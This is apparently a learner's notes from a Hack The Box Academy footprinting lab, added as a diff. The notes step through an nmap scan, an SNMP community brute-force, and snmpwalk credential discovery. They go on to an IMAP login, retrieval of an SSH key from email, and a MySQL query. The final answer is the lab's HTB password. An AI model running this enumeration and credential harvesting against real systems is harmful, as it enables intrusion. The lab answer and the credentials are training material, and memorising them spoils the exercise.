@@ -1,0 +1,82 @@
+The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named HTB was also created here, whose credentials we need to access.
+
+The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. 
+Accordingly, a user named HTB was also created here, whose credentials we need to access.
+
+Question: Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.
+
+1) sudo nmap -sCV -A 10.129.241.210
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:51 CST
+Nmap scan report for 10.129.241.210
+Host is up (0.0085s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
+|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
+|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
+110/tcp open  pop3     Dovecot pop3d
+|_pop3-capabilities: CAPA UIDL AUTH-RESP-CODE STLS USER SASL(PLAIN) TOP PIPELINING RESP-CODES
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+143/tcp open  imap     Dovecot imapd (Ubuntu)
+|_imap-capabilities: LITERAL+ ENABLE capabilities listed ID IDLE post-login IMAP4rev1 AUTH=PLAINA0001 SASL-IR OK LOGIN-REFERRALS Pre-login have more STARTTLS
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_imap-capabilities: ENABLE capabilities listed ID LITERAL+ OK IMAP4rev1 AUTH=PLAINA0001 SASL-IR post-login LOGIN-REFERRALS Pre-login have more IDLE
+|_ssl-date: TLS randomness does not represent time
+995/tcp open  ssl/pop3 Dovecot pop3d
+| ssl-cert: Subject: commonName=NIXHARD
+| Subject Alternative Name: DNS:NIXHARD
+| Not valid before: 2021-11-10T01:30:25
+|_Not valid after:  2031-11-08T01:30:25
+|_ssl-date: TLS randomness does not represent time
+|_pop3-capabilities: TOP CAPA SASL(PLAIN) RESP-CODES UIDL AUTH-RESP-CODE PIPELINING USER
+
+2) based on the instructions and output we know weree going to be dealing with one of the email services.. 
+3)  nmap -sU 10.129.241.210 -p 161 --script=snmp-brute -Pn --script-args snmp-brute.communitiesdb=/home/kali/Downloads/htb/academy/resources/snmpcommunities.txt -> 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:53 CST
+Nmap scan report for 10.129.241.210
+Host is up (0.0091s latency).
+
+PORT    STATE SERVICE
+161/udp open  snmp
+
+4) so we see 161 is actually open even though first nmap scan didnt list it ( -sU ) 
+5) onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.241.210
+Scanning 1 hosts, 3219 communities
+10.129.241.210 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
+6) now here i was kind of stuck so i went back to the notes and figured since we knew snmp is open we can try to walk it out babyyyyyyyyyyyyyyyyyyyyyyyy
+7) snmpwalk -c backup -v1 10.129.241.210 -> from this output we do find credentials -> tom:NMds732Js2761
+8) curl -k 'imaps://10.129.241.210' --user tom:NMds732Js2761
+9) valid email outputs 
+10) open up evolution mailclient on the linux box 
+11) set up for tom@inlanefreight.htb
+12) that took too long so lets try the gross ass imaps comamnds 
+13) openssl s_client -connect 10.129.241.210:imaps
+14) 1 LOGIN tom NMds732Js2761
+15) 1 LIST "" * 
+16) 1 SELECT INBOX 
+17) 1 FETCH 1 BODY [] 
+18) find the SSH Key 
+19) make ssh key file on host machine 
+20) chmod 600 tomssh 
+21) ssh tom@10.129.241.210 -i tomssh 
+22) were in, cat /etc/passwd -> we see mysql user lets try to log in with tom 
+23) mysql --user=tom -p
+24) enter password 
+25) show databases;
+26) use users;
+27) show tables;
+28) select * from users where username like 'htb'; 
+29) HTB  - cr3n4o7rzse7rzhnckhssncif7ds
